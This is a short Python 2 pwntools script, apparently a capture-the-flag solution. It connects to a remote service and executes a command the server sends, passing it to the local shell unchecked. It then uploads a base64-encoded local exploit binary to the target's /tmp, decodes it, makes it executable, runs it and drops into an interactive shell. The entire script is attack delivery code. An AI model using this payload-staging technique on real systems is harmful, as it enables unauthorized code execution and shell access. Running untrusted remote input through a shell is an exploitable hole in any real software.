from pwn import *
import subprocess

target = remote("be.ax", 31337)

print target.recvuntil(": ")
cmd = target.recvline()
returned_output = subprocess.check_output(cmd, shell=True)

print target.sendlineafter(":", returned_output)

cmd = "base64 ./fs/home/ctf/exploit"
b64exp = subprocess.check_output(cmd, shell=True)

target.sendline("cd /tmp")

pload = 'echo "' + b64exp + '" > b64exp' 
target.sendline(pload)

target.sendline("base64 -d b64exp > exploit")
target.sendline("chmod +x exploit")
target.sendline("./exploit")

target.interactive()